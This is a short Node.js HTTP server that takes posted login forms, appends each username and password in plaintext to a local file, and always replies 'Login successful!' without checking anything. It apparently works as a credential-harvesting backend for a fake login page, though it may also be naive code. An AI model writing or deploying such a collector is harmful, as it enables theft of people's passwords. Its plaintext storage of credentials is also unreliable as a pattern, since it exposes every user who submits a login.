const fs = require('fs');
const http = require('http');

const server = http.createServer((req, res) => {
  if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString(); // convert Buffer to string
    });
    req.on('end', () => {
      const formData = new URLSearchParams(body);
      const username = formData.get('username');
      const password = formData.get('password');
      const loginData = `Username: ${username}\nPassword: ${password}\n\n`;

      fs.appendFile('login_data.txt', loginData, (err) => {
        if (err) throw err;
        console.log('Login data saved!');
      });

      res.writeHead(200, {'Content-Type': 'text/plain'});
      res.end('Login successful!');
    });
  }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
